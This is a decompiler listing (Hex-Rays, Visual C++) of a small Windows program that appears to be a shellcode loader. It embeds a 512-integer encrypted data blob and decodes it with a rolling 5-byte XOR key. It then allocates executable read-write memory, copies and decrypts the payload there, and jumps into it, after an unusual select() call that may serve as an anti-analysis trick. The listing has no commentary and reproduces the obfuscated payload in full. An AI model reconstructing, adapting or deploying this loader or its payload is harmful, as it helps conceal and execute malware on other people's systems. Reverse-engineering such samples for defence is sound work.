/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(int, _BYTE *, int, _DWORD *, unsigned int, int);
int __stdcall start(int, int, int, int);

//-------------------------------------------------------------------------
// Data declarations

int dword_403000[512] =
{
  -945097991,
  -1429546379,
  1101847116,
  -103900602,
  1915429279,
  1285331375,
  570226000,
  893988282,
  959395873,
  -1342596418,
  1301581055,
  1257291266,
  -1948920397,
  809491862,
  669469514,
  1105972792,
  -1769220639,
  1244676061,
  942139211,
  -503452722,
  128981645,
  348456505,
  -1784185337,
  904463459,
  -385128954,
  191235637,
  -81366416,
  -905617408,
  1915078570,
  1615766159,
  1005535493,
  1771510958,
  104196363,
  904465254,
  1948983711,
  -950628546,
  566950181,
  581512578,
  114964582,
  -1362923959,
  -1977354575,
  -1566608679,
  1124430020,
  -1129432065,
  2015502646,
  191235642,
  -81366416,
  -905617408,
  1915078570,
  -845700465,
  945108293,
  567164326,
  -1233507958,
  -1926907038,
  764551644,
  940319403,
  1850279642,
  -961237309,
  -2115136735,
  -1371799741,
  -2102803780,
  1452241113,
  1090871372,
  904305231,
  -385128954,
  191235637,
  690385520,
  -1891746517,
  -114964646,
  -779981366,
  -945108231,
  -1440563998,
  234431943,
  -115004433,
  1610656458,
  -945108479,
  -871708123,
  -1610260402,
  -244822870,
  -625917285,
  53032198,
  1519349805,
  -905093120,
  304465834,
  -778952253,
  1319831674,
  -280949392,
  1052028471,
  -2076340335,
  -711843440,
  -995979406,
  -415114905,
  -1028870605,
  1890440105,
  1615611551,
  -806928119,
  569291046,
  1100992914,
  1883477678,
  1749833359,
  -805355255,
  -1512658906,
  1090871408,
  -182005785,
  -578149560,
  -1790533774,
  -87638866,
  889680431,
  -236895147,
  548563535,
  743608178,
  -1722281439,
  -1759728121,
  904465257,
  1948983711,
  1319276402,
  -415169184,
  -1028870597,
  1914279593,
  894346895,
  1285982066,
  -1375176140,
  1140154444,
  -177713990,
  -414926015,
  -672185875,
  -415110740,
  1273540311,
  -115005592,
  830611914,
  572643952,
  1711684216,
  104196363,
  904465254,
  -1507122785,
  -2111715819,
  -495061459,
  850701505,
  -164785631,
  -1361844099,
  -1826110796,
  -12328668,
  851226171,
  2061339169,
  1749986083,
  -1284878591,
  1453289994,
  1140156236,
  -1263651857,
  898273598,
  -1843275378,
  1586459353,
  -202283068,
  -61417489,
  -834932927,
  1005011444,
  602028198,
  185784714,
  481167257,
  -385128041,
  191235637,
  1711683049,
  -1693077870,
  -103185811,
  -1496864054,
  -1280647548,
  -1097895379,
  -2022691508,
  89670742,
  -1361322294,
  -2111752532,
  -1500986827,
  -2022558539,
  -176927658,
  641462081,
  -1835810135,
  568691509,
  1101542794,
  1920453631,
  -845700465,
  945108413,
  600194470,
  -1216685694,
  -45037738,
  86797049,
  -943802502,
  -415108783,
  917286611,
  -1129392605,
  897755590,
  -1000962190,
  -12456604,
  -960819653,
  980951585,
  -1507122785,
  -2111716843,
  1385132077,
  -905881532,
  -1129386530,
  762357042,
  -1645792392,
  -1228932827,
  1090613324,
  -1155084305,
  -645782538,
  1180075890,
  -1433425636,
  1107054791,
  -70370321,
  -1068733703,
  191236516,
  1711683049,
  104196363,
  904465254,
  -1507122785,
  -2111716843,
  -1423279571,
  -2022561613,
  130303138,
  -472914109,
  1286260412,
  1117319536,
  889641547,
  1881211689,
  1480873615,
  -1008743931,
  -1021232874,
  -625175864,
  -1025930719,
  565567115,
  -1639904566,
  -1163964886,
  1090871372,
  1885149158,
  1480872583,
  -1008743935,
  -350144234,
  -626224440,
  1915847201,
  1900828295,
  -685525464,
  -1500557526,
  -1047730878,
  1926859297,
  1962693279,
  1285732781,
  -271978144,
  -1594896833,
  23088298,
  764027290,
  1006584232,
  1415319927,
  242932280,
  -1530901318,
  -385128951,
  191235637,
  1711683049,
  104196363,
  2060012799,
  1615511078,
  -943678971,
  -415106993,
  -216959793,
  2061121621,
  1615772174,
  1073692929,
  -1446855506,
  -1888470651,
  23612506,
  248250177,
  -2111710552,
  989231829,
  1106137543,
  -1397866521,
  899056070,
  1281003378,
  -1496714904,
  649374807,
  -1125990335,
  633842214,
  738148857,
  557755564,
  796053890,
  904463607,
  -385128954,
  191235637,
  690385520,
  -1888191189,
  -112224418,
  1749855136,
  239246321,
  691341019,
  -1888471805,
  358106182,
  381738954,
  -977460423,
  -12453595,
  -360470997,
  -903695702,
  666911498,
  -2111714567,
  -1568181559,
  1138322884,
  -1397866521,
  763502886,
  1317964026,
  -415164064,
  -1028870613,
  1882822313,
  -1832366433,
  -1977492804,
  -1299463479,
  -901077304,
  1311426474,
  1615641247,
  -806928127,
  593163558,
  -1619854966,
  896552614,
  -1407455423,
  -1977548100,
  584807405,
  -1888296302,
  -1942618778,
  -491115804,
  1286979321,
  -79679128,
  212643270,
  -1008106975,
  850570138,
  -983396486,
  -1475953498,
  -901818297,
  -1126036513,
  633842186,
  -593354247,
  1427340012,
  1094281294,
  -1398011905,
  -1715852938,
  -924008455,
  567983250,
  2113324426,
  -1397979458,
  -645783242,
  1280214898,
  -1094061712,
  581741638,
  -1026719199,
  917849743,
  -1002010766,
  -403501720,
  1106335279,
  -674484241,
  -1496864053,
  -1280695676,
  1116697133,
  -889715410,
  559939754,
  633842378,
  1279696754,
  1112138087,
  985443526,
  -1023571423,
  -1429710201,
  -945108474,
  -1458389842,
  -513747582,
  1893537384,
  1884061327,
  1072644397,
  -1446857554,
  -2022656565,
  -177189770,
  -1367343293,
  -2111629636,
  512193169,
  -1619970995,
  1096829977,
  196262640,
  -954615943,
  -415111599,
  -878137485,
  1922535970,
  1979519631,
  1153286136,
  700992864,
  1258003842,
  -1943702057,
  -1987941114,
  -945108231,
  1674703310,
  1124531268,
  -1397855257,
  -1919802522,
  1308790642,
  -683071136,
  -1634982633,
  1928432161,
  -1832367457,
  -2111602435,
  1451717337,
  1092448332,
  -47788049,
  -847109312,
  -62748814,
  -1984424600,
  -921341876,
  -1407437825,
  -1361061598,
  1291503292,
  563868008,
  -2005782126,
  1895119034,
  1615610511,
  1150296337,
  -557182632,
  582790850,
  -540088255,
  505407297,
  -1008780620,
  -1339959090,
  -903260092,
  -1397830444,
  606939422,
  744136560,
  2123330092,
  1140385092,
  214704111,
  372790580,
  -1706081991,
  1711683046,
  104196363,
  904465254,
  -1507122785,
  -1171658219,
  -1547765451,
  1240031308,
  -1943680046,
  633737920,
  -1773991175,
  566950180,
  -1687016054,
  -379564878,
  -1395131703,
  -1977536852,
  -1426884043,
  -1619905101,
  -513323870,
  651683649,
  1072645112,
  -12454194,
  -759451953,
  -97154527,
  1615772299,
  737086721,
  -1429538523,
  1091924044,
  -978960401,
  783526490,
  1145472882,
  -414975772,
  1091620395,
  -1398004737,
  -914218694,
  1319643704,
  -414771872,
  -829197265,
  -1412853209,
  1966600007,
  1287554930,
  2016800116,
  1091395662,
  -1046069265,
  -2075941430,
  1286261497,
  -1153367704,
  -889600186,
  -1018083414,
  -1371541695,
  944458737,
  599066330,
  -1619863158,
  -1129409194,
  1032790470,
  1002709672,
  1850279642,
  783068879,
  -1129396957,
  637479214,
  -32325492,
  1124792612,
  -889641661,
  -1263631295,
  1033249218,
  -1001222286,
  1251962933,
  -1678940084,
  -154824159,
  -1365792643,
  103361204,
  -12474329,
  -759451957,
  95629306,
  -515615435,
  602358249,
  -12453716,
  -893147613,
  -1063403297,
  -838358325,
  602882502,
  600717734
}; // weak
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern int (__stdcall *select)(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, _BYTE *a2, int a3, _DWORD *a4, unsigned int a5, int a6)
{
  __int16 v8; // [esp+0h] [ebp-8h]
  _BYTE *i; // [esp+10h] [ebp+8h]

  *a4 = a3;
  v8 = a5 % 5;
  for ( i = (_BYTE *)(a5 + a1); a3--; ++i )
  {
    *a2 = *(_BYTE *)(a6 + v8++) ^ *i;
    if ( v8 == 5 )
      v8 = 0;
    ++a2;
  }
  return 1;
}

//----- (004010F5) --------------------------------------------------------
int __stdcall start(int a1, int a2, int a3, int a4)
{
  void (**v4)(void); // eax
  SIZE_T j; // [esp+0h] [ebp-1E8h]
  char *v7; // [esp+10h] [ebp-1D8h]
  int v8; // [esp+14h] [ebp-1D4h] BYREF
  int v9; // [esp+18h] [ebp-1D0h] BYREF
  int v10; // [esp+1Ch] [ebp-1CCh] BYREF
  int *v11; // [esp+20h] [ebp-1C8h]
  int i; // [esp+24h] [ebp-1C4h]
  int v13[4]; // [esp+28h] [ebp-1C0h]
  void **v14; // [esp+38h] [ebp-1B0h]
  int v15; // [esp+3Ch] [ebp-1ACh] BYREF
  SIZE_T dwSize; // [esp+40h] [ebp-1A8h] BYREF
  int v17[2]; // [esp+44h] [ebp-1A4h] BYREF
  int *v18; // [esp+4Ch] [ebp-19Ch]
  char v19[4]; // [esp+50h] [ebp-198h]
  int v20; // [esp+54h] [ebp-194h]
  char v21[388]; // [esp+60h] [ebp-188h] BYREF
  SIZE_T v22; // [esp+1E4h] [ebp-4h]
  void *retaddr; // [esp+1ECh] [ebp+4h] BYREF

  v4 = (void (**)(void))select(0, 0, 0, 0, 0);
  if ( v4 != (void (**)(void))-1 )
    (*v4)();
  v14 = &retaddr;
  v21[0] = -7;
  v21[1] = -54;
  v21[2] = -86;
  v21[3] = -57;
  v21[4] = 37;
  v18 = dword_403000;
  dwSize = dword_403000[1];
  sub_401000((int)&v15, &dwSize, 4, v17, 4u, (int)v21);
  v22 = (SIZE_T)v18 + dwSize + 250;
  for ( i = 0; i < 16; ++i )
  {
    *((_BYTE *)v13 + i) = *(_BYTE *)(i + v22);
    v19[i] = *(_BYTE *)(i + v22 + 16);
  }
  v17[1] = v20;
  v17[0] = v20 + v13[0];
  v9 = *v18;
  sub_401000((int)&v9, &v9, 4, &v10, 0, (int)v21);
  dwSize = v18[1];
  sub_401000((int)&v15, &dwSize, 4, &v10, 4u, (int)v21);
  v7 = (char *)VirtualAlloc(0, dwSize, 0x3000u, 0x40u);
  GetModuleHandleW(0);
  v11 = v18 + 2;
  for ( j = 0; j < dwSize; ++j )
    v7[j] = *((_BYTE *)v11 + j);
  sub_401000((int)(v7 - 8), v7, dwSize, &v8, 8u, (int)v21);
  ((void (__stdcall *)(char *, char *, int, SIZE_T, char *, void **))(v7 + 4112))(
    (char *)v18 + dwSize + 8,
    v7,
    v9,
    dwSize,
    v21,
    v14);
  return 0;
}
// 403000: using guessed type int dword_403000[512];
// 4010F5: using guessed type char var_198[4];

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
